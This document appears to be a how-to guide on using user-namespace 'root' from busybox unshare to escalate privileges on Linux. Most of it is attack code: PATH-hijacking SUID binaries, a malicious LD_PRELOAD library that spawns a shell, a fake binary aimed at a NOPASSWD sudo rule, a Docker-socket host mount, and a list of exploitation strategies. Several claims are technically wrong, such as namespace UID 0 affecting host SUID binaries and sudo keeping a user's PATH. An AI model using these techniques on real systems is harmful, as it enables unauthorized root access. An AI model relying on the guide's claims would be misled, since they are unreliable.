# Complete Guide to "Faux UID 0" with Busybox unshare

## Understanding Namespace UID 0 ("Faux Root")

When you run `busybox sh -c "unshare -Urmin"`, you create a user namespace where:
- You have UID 0 **inside the namespace only**
- Outside the namespace, you're still your unprivileged user
- Many security checks can be bypassed, but true root access is limited

## What You Can Do with Namespace UID 0

### 1. Bypass UID-Based Checks

Many programs only check `if (getuid() == 0)` to determine if you're root:

```bash
# Example vulnerable C program
#include <stdio.h>
#include <unistd.h>

int main() {
    if (getuid() == 0) {
        printf("Root access granted!\n");
        system("/bin/sh");  // Will run with SUID privileges if set
    } else {
        printf("Not root, access denied\n");
    }
    return 0;
}
```

### 2. PATH Hijacking SUID Binaries

Exploitable when a SUID binary uses relative paths:

```bash
# Create malicious replacement
echo '#!/bin/bash' > /tmp/some_command
echo '/bin/bash' >> /tmp/some_command
chmod +x /tmp/some_command

# Modify PATH
export PATH=/tmp:$PATH

# Run vulnerable SUID binary that uses `system("some_command")`
/usr/local/bin/vulnerable_program
```

### 3. LD_PRELOAD Attacks (Limited)

Create a malicious shared library to hook functions:

```c
// evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int geteuid() {
    return 0; // Always return 0 (root)
}

void _init() {
    system("/bin/sh");
}
```

```bash
# Compile
gcc -shared -fPIC evil.c -o evil.so

# Use with LD_PRELOAD
LD_PRELOAD=./evil.so some_vulnerable_program
```

### 4. Manipulating Your Own Namespace

You can mount filesystems within your namespace:

```bash
# Create a mount point
mkdir /tmp/mnt

# Mount a tmpfs
mount -t tmpfs none /tmp/mnt

# Create files with "root" ownership inside the namespace
touch /tmp/mnt/root_file
ls -la /tmp/mnt/
```

### 5. Exploiting Capabilities

Some programs check capabilities instead of UID:

```bash
# Check what capabilities you have in namespace
capsh --print

# Use capabilities to do privileged operations
# For example, with net_admin capability:
ip link add dummy0 type dummy
```

### 6. Process Information Access

Access information normally restricted:

```bash
# Read process information
cat /proc/self/status
cat /proc/self/environ

# Access other processes' information
cat /proc/*/cmdline
```

## Detailed Examples

### Example 1: Creating a Fake Service that Requires Root

```bash
# Inside namespace (UID 0)
cat > /tmp/fake_service.sh << 'EOF'
#!/bin/bash
if [ $(id -u) -eq 0 ]; then
    echo "Running as root, starting service..."
    # This would execute with SUID privileges if the script is called by a SUID binary
    echo "Creating privileged file..."
    touch /tmp/proof_of_execution
else
    echo "Not running as root, exiting."
    exit 1
fi
EOF

chmod +x /tmp/fake_service.sh
```

### Example 2: Exploiting sudo with NOPASSWD but Limited Commands

If there's a sudoers entry like:
```
user ALL=(ALL) NOPASSWD: /usr/bin/service
```

You might exploit it:
```bash
# Inside namespace (UID 0)
# Create fake 'service' binary
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash' >> /tmp/service
chmod +x /tmp/service

# Add to PATH
export PATH=/tmp:$PATH

# Run sudo command that uses this PATH
sudo service
```

### Example 3: Abusing setuid(0) Calls

```c
// vulnerable.c
#include <stdio.h>
#include <unistd.h>

int main() {
    if (getuid() == 0) {
        // Attempt to drop privileges but restore them
        setuid(1000);  // Drop to regular user
        printf("Temporarily dropped privileges\n");
        setuid(0);     // Try to restore to root
        system("/bin/sh");
    } else {
        printf("Not root\n");
    }
    return 0;
}
```

### Example 4: Exploiting Environment Variables

```bash
# Set environment variables that might be used by SUID programs
export EDITOR=/tmp/malicious_editor

# Then run a vulnerable SUID program that uses $EDITOR
vulnerable_program
```

### Example 5: Running Docker with Namespace Privileges

```bash
# In namespace with UID 0
# If Docker socket is readable
docker run -v /:/host alpine chroot /host /bin/bash
```

## Limitations of Namespace Root

1. **No access to real privileged files**: Can't read `/etc/shadow` or other root-only files
2. **No access to devices**: Many device operations remain restricted
3. **Can't modify the host system directly**: You need additional vulnerabilities
4. **Can't load kernel modules**: Kernel operations remain restricted
5. **SELinux/AppArmor still apply**: MAC restrictions still work against namespace root

## Key Exploitation Strategies

1. **Look for SUID binaries that only check getuid() == 0**
2. **Identify programs that use relative paths**
3. **Find services that verify UID but run with elevated privileges**
4. **Exploit environment variables that affect privileged programs**
5. **Leverage external interfaces (Docker socket, DBs) that trust UID 0**

This namespace privilege is most powerful when combined with other vulnerabilities to achieve true root access on the host system.
